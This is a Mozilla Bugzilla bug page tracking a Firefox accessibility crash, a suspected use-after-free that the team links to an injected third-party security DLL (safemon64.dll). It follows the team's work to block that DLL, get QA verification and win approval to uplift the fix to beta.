[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

[[@ nsTArray\_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl\*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent ]](https://crash-stats.mozilla.org/signature/?signature=nsTArray_Impl%3CT%3E%3A%3ARemoveElement%3CT%3E%28class%20%60anonymous%20namespace%27%3A%3AParentImpl%2A%26%20const%2C%20const%20class%20nsDefaultComparator%3CT%3E%26%20const%29%20%7C%20mozilla%3A%3Aa11y%3A%3ADocAccessibleParent%3A%3ARecvHideEvent)

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (1 file)

| [Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.](/attachment.cgi?id=9057749)  [6 years ago](#c8)  [James Teh [:Jamie] (away returning 28 Jan)](/user_profile?user_id=219126)   47 bytes, text/x-phabricator-request | RyanVM : [approval-mozilla-beta+](#c30 "6 years ago")  RyanVM : [approval-mozilla-esr68+](#c40 "5 years ago")  abillings : [sec-approval+](#a10033098_280903 "6 years ago") | [Details](/attachment.cgi?id=9057749&action=edit) | [Review](/attachment.cgi?id=9057749) |
| --- | --- | --- |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [[:philipp]](/user_profile?user_id=209011)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1536227#c0)• 6 years ago |
|  | |

This bug is for crash report [bp-ee4cf772-6446-4451-86a1-253e90190315](https://crash-stats.mozilla.org/report/index/ee4cf772-6446-4451-86a1-253e90190315).

```
Top 7 frames of crashing thread:

0 xul.dll static bool nsTArray_Impl< xpcom/ds/nsTArray.h:1778
1 xul.dll mozilla::a11y::DocAccessibleParent::RecvHideEvent accessible/ipc/DocAccessibleParent.cpp:184
2 xul.dll mozilla::a11y::PDocAccessibleParent::OnMessageReceived ipc/ipdl/PDocAccessibleParent.cpp:287
3 xul.dll void mozilla::ipc::MessageChannel::DispatchMessage ipc/glue/MessageChannel.cpp:2078
4 xul.dll nsresult mozilla::ipc::MessageChannel::MessageTask::Run ipc/glue/MessageChannel.cpp:1968
5 xul.dll nsThread::ProcessNextEvent xpcom/threads/nsThread.cpp:1179
6 xul.dll XPTC__InvokebyIndex

```

these crashes are starting to show up since firefox 63 on 64bit versions of windows - in rather low volume though. most of the affected builds and comments are in chinese.

a portion of crashes are looking like wild-pointer issues.

|  | [yxu](/user_profile?user_id=565421) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1536227#c1)• 6 years ago |
|  | |

Through the information I get from some users, I do see some 3rd-part programs that use accessible api collect data. A crash is not necessarily the end result, there are some hangs, and it affects network loading. There usually have some dll injections. I think after release firefox 66, we can see if [Bug 1306406](/show_bug.cgi?id=1306406 "NEW - [Meta] Mitigations for DLL Injection") is helpful.

|  | [Tyson Smith [:tsmith] (PTO)](/user_profile?user_id=486634) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1536227#a247645_486634)• 6 years ago |

Group: core-security → dom-core-security

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1536227#c2)• 6 years ago |
|  | |

Interesting correlations, like

(100.0% in signature vs 01.41% overall) Module "safemon64.dll" = true

|  | [Eitan Isaacson [:eeejay]](/user_profile?user_id=291675) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1536227#c3)• 6 years ago |
|  | |

Adding Jamie. Quick fix would be to disable that dll, but I don't think that fixes the root cause, which we are still responsible for.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1536227#a355700_1689)• 6 years ago |

Group: dom-core-security → layout-core-security

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1536227#a852857_406194)• 6 years ago |

Keywords: [sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1536227#c4)• 6 years ago |
|  | |

The crash rate on beta and release is noticable, Jamie could we get somebody to investigate a solution or a mitigation for this bug please? Thanks

Flags: needinfo?(jteh)

|  | [James Teh [:Jamie] (away returning 28 Jan)](/user_profile?user_id=219126)  Assignee |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1536227#c5)• 6 years ago |
|  | |

From what I can see, this happens when a content process tells the parent process that an accessible has been hidden (removed). The parent process crashes in ProxyAccessible::RemoveChild when we try to remove the just hidden ProxyAccessible from its parent. This suggests that the parent was already destroyed or that it somehow got destroyed between when we fetched it and when we called RemoveChild. Maybe re-entry somewhere within a win event callback? I don't know what code could execute on our side to destroy a ProxyAccessible while we're blocked on an IPC call, though; we should only mutate the ProxyAccessible tree in response to IPC calls (and I'm fairly certain it's not possible to receive an IPC call while an earlier call is still running).

Without being able to reproduce this, debugging it and fixing it properly is going to be practically impossible.

To mitigate this, given the very strong correlation with safemon64.dll, I think we should just block this. Brief searching suggests this is related to 360 Safeguard/360 Total Security, which is security/anti-malware software. However, it's unclear why it needs to inject a dll into our process anyway.

Aaron, thoughts? Do we have any kind of process for approving/determining whether we should block in-process injection by "security" software?

Assignee: nobody → jtehFlags: needinfo?(jteh) → needinfo?(aklotz)

|  | [(No longer employed by Mozilla) Aaron Klotz](/user_profile?user_id=454100) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1536227#c6)• 6 years ago |
|  | |

(In reply to James Teh [:Jamie] from [comment #5](/show_bug.cgi?id=1536227#c5 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]"))

> Aaron, thoughts? Do we have any kind of process for approving/determining whether we should block in-process injection by "security" software?

Our current "process" (I am using that term rather loosely) is to add it to the blocklist and send it to me for review. Ideally we'd also verify this with a QA pass to make sure that the browser still starts with that product installed, though I checked our new Untrusted Modules telemetry data and I don't see any loads in there that look particularly risky.

Flags: needinfo?(aklotz)

|  | [James Teh [:Jamie] (away returning 28 Jan)](/user_profile?user_id=219126)  Assignee |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1536227#c7)• 6 years ago |
|  | |

I can provide a patch and a try build. Do we have someone who can test this with the security software packages in question?

|  | [James Teh [:Jamie] (away returning 28 Jan)](/user_profile?user_id=219126)  Assignee |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1536227#c8)• 6 years ago |
|  | |

Attached file
[Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.](attachment.cgi?id=9057749)
— [Details](attachment.cgi?id=9057749&action=edit)

|  | [(No longer employed by Mozilla) Aaron Klotz](/user_profile?user_id=454100) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1536227#c9)• 6 years ago |
|  | |

(In reply to James Teh [:Jamie] from [comment #7](/show_bug.cgi?id=1536227#c7 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]"))

> I can provide a patch and a try build. Do we have someone who can test this with the security software packages in question?

I think QA has done this before. Maybe it needs a PI-request?

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1536227#c10)• 6 years ago |
|  | |

(In reply to James Teh [:Jamie] from [comment #7](/show_bug.cgi?id=1536227#c7 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]"))

> I can provide a patch and a try build. Do we have someone who can test this with the security software packages in question?

asking QA

Flags: qe-verify?

|  | [James Teh [:Jamie] (away returning 28 Jan)](/user_profile?user_id=219126)  Assignee |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1536227#c11)• 6 years ago |
|  | |

Try run (Win64 opt build only):

<https://treeherder.mozilla.org/#/jobs?repo=try&revision=b9e51fb7427a3b36aec7d33e5e36ef979019fbf6>

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1536227#a3343644_24572)• 6 years ago |

Flags: qe-verify? → qe-verify+

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1536227#a3365426_451704)• 6 years ago |

[status-firefox66](/buglist.cgi?f1=cf_status_firefox66&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox66&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox66&o1=equals&v1=wontfix)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1536227#c12)• 6 years ago |
|  | |

Hey Jamie, what ever ended up happening with this bug?

[status-firefox67](/buglist.cgi?f1=cf_status_firefox67&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox67&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox67&o1=equals&v1=wontfix)
[status-firefox69](/buglist.cgi?f1=cf_status_firefox69&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=affected)Flags: needinfo?(jteh)

|  | [James Teh [:Jamie] (away returning 28 Jan)](/user_profile?user_id=219126)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1536227#c13)• 6 years ago |
|  | |

As per [comment 7](/show_bug.cgi?id=1536227#c7 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]") and [comment 11](/show_bug.cgi?id=1536227#c11 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]"), I've provided a patch and a try build, but it needs to be tested with the security software in question, ideally *before* it gets landed. I see qe-verify+ was set, but I don't really know what this means: I didn't hear anything from QA.

Flags: needinfo?(jteh)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1536227#c14)• 6 years ago |
|  | |

qe-verify is something normally used for verifying a bug after it lands. A PI request should be submitted for testing this patch before landing.

|  | [BugBot [:suhaib / :marco/ :calixte]](/user_profile?user_id=575867) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1536227#c15)• 6 years ago |
|  | |

There's a r+ patch which didn't land and no activity in this bug for 2 weeks.

:Jamie, could you have a look please?

For more information, please visit [auto\_nag documentation](https://wiki.mozilla.org/Release_Management/autonag#not_landed.py).

Flags: needinfo?(jteh)

|  | [Selena Deckelmann :selenamarie :selena](/user_profile?user_id=452035) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1536227#a9562099_452035)• 6 years ago |

Priority: -- → P1

|  | [James Teh [:Jamie] (away returning 28 Jan)](/user_profile?user_id=219126)  Assignee |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1536227#c16)• 6 years ago |
|  | |

I tried to submit a PI request, but don't have permission to access Jira. I've emailed pi-request and am awaiting a response.

Flags: needinfo?(jteh)

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1536227#c17)• 6 years ago |
|  | |

Can you also request sec-approval on the patch before landing anything? Thanks!

Flags: needinfo?(jteh)

|  | [Rares Doghi, Desktop QA](/user_profile?user_id=615351) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1536227#c18)• 6 years ago |
|  | |

Hi guys, I've been trying to reproduce this crash on release and beta for a while now on Windows 10 as well as 7 using the 32 bit version of Firefox as well as the 64 bit version of it and without any success, I even tried downloading the chinese version of 360 from <https://www.360.cn/> and used the zh-CN build of Firefox, still no luck.

I've also downloaded the build from <https://www.360totalsecurity.com/> (both of these versions have the safemon64.dll) but I can't trigger the crash with sync activated, 20 tabs open most popular websites, youtube playing and still no crash.

Are there any settings or preferences in 360 that might cause the crash in Firefox ? Or at least some forums where this issue is reported so we can ask for some more information ?

Flags: needinfo?(yxu)Flags: needinfo?(madperson)Flags: needinfo?(dveditz)

|  | [[:philipp]](/user_profile?user_id=209011)  Reporter |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1536227#c19)• 6 years ago |
|  | |

i can just go by crash reports: they are all coming from 64bit firefox builds, comments in reports often talk about media playback but also flash content that would be triggering this crash.

next to having safemon64.dll hook into the browser process, a11y is the other factor contributing to the crashes. for those users with zh-cn builds, wps.exe (apparently related to WPS Office, <https://www.wps.com>) is the most common recorded client on that's triggering a11y services to become active.

if there is no way of reproducing the crash itself, it may be beneficial to trigger an artificial crash with the try build to see if the patch is successful of getting the safemon64.dll module out of our process and that this causes no other obvious negative impacts like loss of connectivity, etc....

Flags: needinfo?(madperson)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1536227#c20)• 6 years ago |
|  | |

I did find a small handful of crashes on en-US builds rather than zh-CN. Of the two I looked at both had a UAF-looking 0xe5e5e5e5e5e5e5e5 in rcx. One had the Qihu safemon64.dll mentioned above; the other didn't but had a bunch of .dlls signed by "Freedom Scientific" which makes accessibility devices (<https://www.freedomscientific.com/>).

[bp-ebfb57cf-51be-45bc-87d2-8fb480190706](https://crash-stats.mozilla.org/report/index/ebfb57cf-51be-45bc-87d2-8fb480190706)

[bp-8864f78f-68b4-42e3-b6a8-df0ec0190710](https://crash-stats.mozilla.org/report/index/8864f78f-68b4-42e3-b6a8-df0ec0190710)

When do we send hide events to Accessibility nodes? How is the 360 software even invoking/using acessibility? Since there's a UAF involved in the call `parent->RemoveChild(root);` maybe something's not holding on to the parent long enough.

Flags: needinfo?(dveditz)Keywords: [csectype-uaf](/buglist.cgi?keywords=csectype-uaf&resolution=---)

|  | [James Teh [:Jamie] (away returning 28 Jan)](/user_profile?user_id=219126)  Assignee |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1536227#c21)• 6 years ago |
|  | |

(In reply to Daniel Veditz [:dveditz] from [comment #20](/show_bug.cgi?id=1536227#c20 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]"))

> I did find a small handful of crashes on en-US builds rather than zh-CN. Of the two I looked at both had a UAF-looking 0xe5e5e5e5e5e5e5e5 in rcx. One had the Qihu safemon64.dll mentioned above; the other didn't but had a bunch of .dlls signed by "Freedom Scientific" which makes accessibility devices (<https://www.freedomscientific.com/>).

Ug. That's probably with the JAWS screen reader.

> When do we send hide events to Accessibility nodes?

This is sent whenever an accessibility object is removed from the tree; e.g. when a node is removed from the DOM or gets hidden.

> How is the 360 software even invoking/using acessibility?

We honestly don't know, and figuring that out would take a lot of debugging. Given the strong correlation with this dll (and given that it doesn't have an obvious reason for needing a11y), we felt the easiest way to "stop the bleeding" was to block it.

> Since there's a UAF involved in the call `parent->RemoveChild(root);` maybe something's not holding on to the parent long enough.

That would seem to be the case, but I can't see how that's possible unless there's some re-entry I'm not accounting for. See my thoughts in [comment 5](/show_bug.cgi?id=1536227#c5 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]").

Flags: needinfo?(jteh)

|  | [James Teh [:Jamie] (away returning 28 Jan)](/user_profile?user_id=219126)  Assignee |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1536227#c22)• 6 years ago |
|  | |

Comment on [attachment 9057749](/attachment.cgi?id=9057749 "Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.") [[details]](/attachment.cgi?id=9057749&action=edit "Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.")

[Bug 1536227](/show_bug.cgi?id=1536227 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]"): Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: The patch doesn't fix the issue, but rather, blocks an injected third party dll that is very strongly correlated with the crash. Thus, there is nothing to learn about the issue from the patch other than a problematic dll being blocked for causing crashes.
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: No
* **Which older supported branches are affected by this flaw?**: beta and release (but release has been declared wontfix)
* **If not all supported branches, which bug introduced the flaw?**: unknown
* **Do you have backports for the affected branches?**: No
* **If not, how different, hard to create, and risky will they be?**: Easy to create, low risk. Only difference is where in the file the entry is placed.
* **How likely is this patch to cause regressions; how much testing does it need?**: QA has verified (with a try build) that this doesn't cause unanticipated side effects with the problematic third party software installed. To be certain, it's worth having this tested again on nightly and beta once landed.
[Attachment #9057749](/attachment.cgi?id=9057749&action=edit "Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.") -
Flags: sec-approval?

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1536227#c23)• 6 years ago |
|  | |

[Tracking Requested - why for this release]: If it affects release then it presumably also affects esr68.

[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F)

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1536227#c24)• 6 years ago |
|  | |

(In reply to James Teh [:Jamie] from [comment #22](/show_bug.cgi?id=1536227#c22 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]"))

> ### Security Approval Request
>
> * **How easily could an exploit be constructed based on the patch?**: The patch doesn't fix the issue, but rather, blocks an injected third party dll that is very strongly correlated with the crash. Thus, there is nothing to learn about the issue from the patch other than a problematic dll being blocked for causing crashes.

Do we want to backport this?

sec-approval+ for trunk.

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1536227#a10033098_280903)• 6 years ago |

[Attachment #9057749](/attachment.cgi?id=9057749&action=edit "Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.") -
Flags: sec-approval? → sec-approval+

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1536227#c25)• 6 years ago |
|  | |

<https://hg.mozilla.org/integration/autoland/rev/eae7203ff8a586da9eccc90764a74de96af70561>

<https://hg.mozilla.org/mozilla-central/rev/eae7203ff8a5>

Group: layout-core-security → core-security-releaseStatus: NEW → RESOLVEDClosed: 6 years ago
[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → mozilla70

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1536227#c26)• 6 years ago |
|  | |

Please nominate this for Beta and ESR68 approval when you get a chance.

[status-firefox68](/buglist.cgi?f1=cf_status_firefox68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=wontfix)
[tracking-firefox69](/buglist.cgi?f1=cf_tracking_firefox69&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox69&o1=equals&v1=%2B)
[tracking-firefox70](/buglist.cgi?f1=cf_tracking_firefox70&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%2B)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F) → [69+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=69%2B)Flags: needinfo?(jteh)

|  | [Rares Doghi, Desktop QA](/user_profile?user_id=615351) |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1536227#c27)• 6 years ago |
|  | |

Hi guys, I have tested this issue in our latest Nightly 70.0a1 (2019-07-17) on a windows 10 64bits with the 360 Total Security antivirus installed that had the above mentioned safemon64.dll, using over 30 tabs, multiple youtube videos playing in the background some on Loop, multiple flash sites with started games and a lot of tabs with some of the more popular websites i.e. reddit, 9gag, deviantart, twitter, facebook, pinterest and I can safely say that no crashes occurred. This issue seems Fixed in our latest Nightly build but please keep in mind that I was unable to reproduce this crash in Release or Beta either.

[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=verified)

|  | [James Teh [:Jamie] (away returning 28 Jan)](/user_profile?user_id=219126)  Assignee |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1536227#c28)• 6 years ago |
|  | |

Comment on [attachment 9057749](/attachment.cgi?id=9057749 "Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.") [[details]](/attachment.cgi?id=9057749&action=edit "Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.")

[Bug 1536227](/show_bug.cgi?id=1536227 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]"): Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.

### Beta/Release Uplift Approval Request

* **User impact if declined**: Crashes which we suspect to be caused by third party security software.
* **Is this code covered by automated tests?**: No
* **Has the fix been verified in Nightly?**: Yes
* **Needs manual test from QE?**: Yes
* **If yes, steps to reproduce**: Test daily Firefox usage with 360 Total Security installed and ensure this does not cause instability or unreliability in 360 Total Security.

  Same with 360 Safeguard.
* **List of other uplifts needed**: None
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: Blocks injection of third party security software into Firefox which has no known reason to inject. QA confirmed that running with this block does not negatively impact the third party software.
* **String changes made/needed**: None.
Flags: needinfo?(jteh)
[Attachment #9057749](/attachment.cgi?id=9057749&action=edit "Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.") -
Flags: approval-mozilla-beta?

|  | [James Teh [:Jamie] (away returning 28 Jan)](/user_profile?user_id=219126)  Assignee |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1536227#c29)• 6 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1536227&comment_id=14243925 "1 revision") |
|  | |

(In reply to Ryan VanderMeulen [:RyanVM] from [comment #26](/show_bug.cgi?id=1536227#c26 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]"))

> Please nominate this for Beta and ESR68 approval when you get a chance.

This patch is somewhat speculative. There was a very high correlation for these crashes with the third party dll in question, but we can't know for certain that this particular dll was causing them. Therefore, I think it makes sense to get this into beta and observe for a while before uplifting to 68. Does this seem reasonable?

(In reply to Al Billings [:abillings] from [comment #24](/show_bug.cgi?id=1536227#c24 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]"))

> Do we want to backport this?
>
> sec-approval+ for trunk.

We want to backport it to beta at least. Is there an additional process I need to follow to get sec-approval for beta?

Flags: needinfo?(ryanvm)Flags: needinfo?(abillings)

|  | [Brindusa Tot, Desktop QA](/user_profile?user_id=553429) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1536227#a10491444_553429)• 6 years ago |

QA Whiteboard: [qa-triaged]

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1536227#c30)• 6 years ago |
|  | |

Comment on [attachment 9057749](/attachment.cgi?id=9057749 "Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.") [[details]](/attachment.cgi?id=9057749&action=edit "Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.")

[Bug 1536227](/show_bug.cgi?id=1536227 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]"): Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.

Approved for 69.0b6.

(In reply to James Teh [:Jamie] from [comment #29](/show_bug.cgi?id=1536227#c29 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]"))

> We want to backport it to beta at least. Is there an additional process I need to follow to get sec-approval for beta?

sec-approval only applies to trunk

Flags: needinfo?(ryanvm)
[Attachment #9057749](/attachment.cgi?id=9057749&action=edit "Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1536227#c31)• 6 years ago |
|  | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/302d6a3d1ca8673034456b04a90489f427793910>

[status-firefox69](/buglist.cgi?f1=cf_status_firefox69&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=fixed)

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1536227#c32)• 6 years ago |
|  | |

(In reply to James Teh [:Jamie] from [comment #29](/show_bug.cgi?id=1536227#c29 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]"))

> We want to backport it to beta at least. Is there an additional process I need to follow to get sec-approval for beta?

No, just ask for beta approval on a patch like normal. Sec-approval is just for mozilla-central.

Flags: needinfo?(abillings)

|  | [Rares Doghi, Desktop QA](/user_profile?user_id=615351) |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1536227#c33)• 6 years ago |
|  | |

Hi I have retested this issue in Our latest beta 69.0b6 and no Issues occur with the 360 Antivirus. I will mark this issue accordingly.

[status-firefox69](/buglist.cgi?f1=cf_status_firefox69&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=verified)

|  | [yxu](/user_profile?user_id=565421) |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1536227#c34)• 5 years ago |
|  | |

About two week ago I tried to contact 360 to ask about the purpose of this dll using the accessibility API. Whether the blocking affects its feature. But no response has been received so far. If there are any messages I will update. It seems 360 Antivirus software is not abnormal during the test. I think we can apply this fix even if we don't receive a reply.

Flags: needinfo?(yxu)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1536227#c35)• 5 years ago |
